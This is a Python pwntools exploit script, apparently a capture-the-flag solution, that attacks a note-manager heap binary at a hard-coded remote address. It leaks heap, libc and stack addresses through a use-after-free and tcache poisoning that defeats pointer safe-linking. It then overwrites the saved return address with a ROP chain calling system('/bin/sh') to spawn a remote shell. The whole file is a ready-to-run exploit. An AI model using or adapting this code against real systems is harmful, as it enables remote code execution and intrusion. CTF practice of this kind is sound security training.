#!/usr/bin/env python3
from pwn import *

PORT = 9009
HOST = "15.235.202.47"
elf = context.binary = ELF('./Heap_devil_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
            brva 0x0000000000001EC2
            brva 0x0000000000001726
            brva 0x00000000000014B5
            brva 0x0000000000001CA6
            c
            set follow-fork-mode parent
            ''')

def conn():
    if args.REMOTE:
        return remote(HOST, PORT)
    else:
        return elf.process()

p = conn()

def create(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'(max 256): ',str(size).encode())
    p.sendlineafter(b"for note: ", data)

def view(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())

def edit(idx, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b"new data: ", data)

def delete(idx):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b': ', str(idx).encode())

def change(idx, size, data):
    p.sendlineafter(b'> ', b'5')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b'(max 512): ',str(size).encode())
    p.sendlineafter(b"for note: ", data)


print("Stage 1: Leak heap_address========")

create(0x40, b"A"*8)
create(0x40, b"B"*8)
delete(1)
view(1)

p.recvuntil(b"DATA: ")
heap_key = u64(p.recv(5) + b'\0'*3)
log.success("heap_base: " + hex(heap_key))
create(0x40, b"B"*8)

print("Stage 2: Leak libc========")

for _ in range(8):
    create(0x100, b'L'*8)

change(0, 0x80, b'G'*8)

for _ in range(7):
    delete(2)       

delete(2) # unsorted_bin

view(2)
p.recvuntil(b"DATA: ")
libc.address = u64(p.recv(6) + b'\0'*2) - 0x203b20
log.success("libc_base: " + hex(libc.address))

print("Stage 3: Leak stack by Tcache Poisoning========")

"""
Malloc chunk tại environ - 0x18.
Vì tcache_get clear target+8, nếu dùng environ-8 sẽ làm zero environ.
Dùng environ-0x18 thì environ nằm ở offset +0x18, không bị phá.
"""

target = libc.sym.environ - 0x18

create(0x40, b"1"*8)
create(0x40, b"2"*8)
create(0x40, b"3"*8)

delete(4)
delete(3)
edit(3, p64(target ^ heap_key))
create(0x40, b'4'*8)
create(0x40, b'')
view(4)
p.recvuntil(b"DATA: ")
leak = p.recvn(0x40)
stack_leak = u64(leak[0x18:0x20])
log.success("stack_leak: " + hex(stack_leak))

print("Stage 4: overwrite saved rip by Tcache Poisoning========")

rop = ROP(libc)

pl = flat(
    0xdeadbeef,
    rop.find_gadget(['ret'])[0],
    rop.find_gadget(['pop rdi', 'ret'])[0],
    next(libc.search(b"/bin/sh\0")),
    libc.sym.system
    )

pl = pl.ljust(0x3f, b'\x00')

saved_rip = stack_leak - 0x160
saved_rbp = saved_rip - 0x8
log.info("saved_rip: " + hex(saved_rip))


create(0x40, b"a"*8)
create(0x40, b"b"*8)

delete(6)
delete(5)
edit(5, p64(saved_rbp ^ heap_key))

create(0x40, b'c')
# GDB()
create(0x40, pl)

p.interactive()